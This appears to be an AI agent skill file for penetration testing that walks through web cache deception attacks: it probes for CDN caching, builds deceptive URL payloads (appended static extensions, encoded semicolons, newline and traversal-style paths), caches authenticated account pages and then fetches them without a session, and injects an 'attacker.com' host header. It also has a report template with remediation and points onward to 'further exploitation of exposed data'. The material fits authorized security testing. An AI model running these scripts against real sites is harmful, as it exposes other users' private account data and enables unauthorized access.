---
name: vuln-cache-deception
description: "Web cache deception testing. CDN caching of authenticated content via extension tricks, path manipulation, URL encoding. Cache behavior analysis, sensitive endpoint discovery. Triggers: 'cache deception', 'web cache deception', 'cdn caching', 'cache poisoning', 'cache-control bypass', 'cache private content', 'cdnjs caching', 'cloudflare cache'."
---

# Web Cache Deception

Attacker tricks CDN/cache into storing authenticated responses, then retrieves them unauthenticated.

---

## Phase 1: Cache Behavior Analysis

```bash
TARGET="https://TARGET"

# Identify caching infrastructure:
curl -sI "$TARGET/" | grep -iE "cache-control|age|x-cache|cf-cache-status|x-varnish|surrogate-control"

# Check X-Cache and Age headers:
# X-Cache: HIT → cached response
# Age: N → seconds since cached
# CF-Cache-Status: HIT|MISS|DYNAMIC
# Cache-Control: public → cacheable; private/no-store → should not be cached

# Test static endpoint caching (baseline):
curl -sI "$TARGET/style.css" | grep -i cache
curl -sI "$TARGET/favicon.ico" | grep -i cache
```

---

## Phase 2: Identify Sensitive Endpoints

```bash
# Target endpoints that should NEVER be cached (authenticated content):
SENSITIVE=(
  "/account"
  "/account/settings"
  "/account/billing"
  "/profile"
  "/dashboard"
  "/orders"
  "/api/me"
  "/api/user"
  "/api/account"
  "/admin"
)

# Check each for cache headers:
for ep in "${SENSITIVE[@]}"; do
  echo -n "$ep → "
  curl -sI -b "session=VALID_SESSION" "$TARGET$ep" | grep -i "cache-control\|x-cache"
done
```

---

## Phase 3: Construct Deception Payloads

```bash
TARGET_PAGE="$TARGET/account"

# Method 1: Extension-based tricks (append cacheable extension):
PAYLOADS=(
  "${TARGET_PAGE}.css"
  "${TARGET_PAGE}.js"
  "${TARGET_PAGE}.png"
  "${TARGET_PAGE}.ico"
  "${TARGET_PAGE}.svg"
  "${TARGET_PAGE}.woff2"
  "${TARGET_PAGE}/nonexistent.css"
  "${TARGET_PAGE}%3Bnonexistent.css"   # semicolon (path param)
  "${TARGET_PAGE}%2F..%2Fstyle.css"    # directory traversal-style
)

# Method 2: Path separator tricks (semicolons, encoded slashes):
echo "$TARGET/account;.css"
echo "$TARGET/account/.css"
echo "$TARGET/account%0A.css"   # newline

# Method 3: Extra path segments:
echo "$TARGET/account/anything.css"
echo "$TARGET/account/../account.css"
```

---

## Phase 4: Test Cacheability (While Authenticated)

```bash
SESSION="your-authenticated-session-cookie"

for url in "${PAYLOADS[@]}"; do
  echo "=== Testing: $url ==="
  # First request (populate cache):
  response=$(curl -sI -b "session=$SESSION" "$url")
  echo "$response" | grep -iE "cache-control|x-cache|age|cf-cache-status"
  
  # Check if we got content back:
  echo "$response" | grep -i "200"
  echo "---"
done
```

---

## Phase 5: Verify Unauthenticated Retrieval (Exploit)

```bash
# After authenticated requests above — try without session cookie:
for url in "${PAYLOADS[@]}"; do
  echo -n "Unauthenticated $url → "
  result=$(curl -s -b "" "$url" | grep -c "username\|email\|account\|profile\|billing")
  if [ "$result" -gt 0 ]; then
    echo "[VULNERABLE] Cached authenticated content exposed!"
    curl -s "$url" | grep -E "username|email|account|profile|billing" | head -5
  else
    status=$(curl -sI "$url" | head -1)
    echo "Safe ($status)"
  fi
done
```

---

## Phase 6: Automated Assessment

```bash
# nuclei cache deception templates:
nuclei -t http/misconfiguration/cache/ -u $TARGET
nuclei -t http/vulnerabilities/other/web-cache-deception.yaml -u $TARGET

# Manual curl with verbose cache analysis:
curl -v -b "session=$SESSION" "$TARGET/account.js" 2>&1 | grep -E "< (cache|age|x-cache|cf)"
sleep 2  # Wait for cache TTL
curl -v "$TARGET/account.js" 2>&1 | grep -E "< (cache|age|x-cache|cf|HTTP)"
```

---

## Phase 7: Cache Key Analysis

```bash
# Understand what's in cache key — test header variations:
BASE="$TARGET/account.css"

# Cache key often includes Host, Accept-Encoding, but NOT cookies:
curl -sI -H "Accept-Language: en-US" -b "session=$SESSION" "$BASE"
curl -sI -H "Accept-Language: fr-FR" -b "session=$SESSION" "$BASE"

# Headers that might vary cache key:
for header in "X-Forwarded-Host" "X-Original-URL" "X-Rewrite-URL"; do
  echo "=== $header ==="
  curl -sI -H "$header: attacker.com" "$BASE" | grep -i "cache\|vary\|host"
done
```

---

## Report Template

```markdown
## Vulnerability: Web Cache Deception

**Severity:** High
**Endpoint:** [TARGET_URL]
**Payload:** `[URL]`

### Steps to Reproduce
1. Authenticate as victim
2. Request: `GET [DECEPTIVE_URL]` with `Cookie: session=VICTIM_SESSION`
3. Wait N seconds
4. Request same URL without cookies: `GET [DECEPTIVE_URL]`
5. Observe authenticated response served to unauthenticated user

### Evidence
- Cached response contains: [username/email/PII]
- X-Cache: HIT on unauthenticated request
- Age header present, confirming cached response

### Root Cause
Cache treats `[DECEPTIVE_URL]` as static resource due to [extension/path/rule].
Cache key does not include session cookies.

### Remediation
1. Set `Cache-Control: private, no-store` on all authenticated endpoints
2. Normalize URLs — reject unexpected extensions on authenticated paths
3. Configure CDN to respect `Cache-Control: private`
4. Use `Vary: Cookie` header to include session in cache key
```

---

## Output

Save to `.omop/engagement/vuln/cache-deception/`:
- `cache-analysis.txt` — cache header behavior for each endpoint
- `vulnerable-urls.txt` — deceptive URLs that cache authenticated content
- `unauthenticated-responses/` — proof of data exposure

## Next Phase

→ `pentest-exploit` for further exploitation of exposed data
→ `pentest-report` for final report
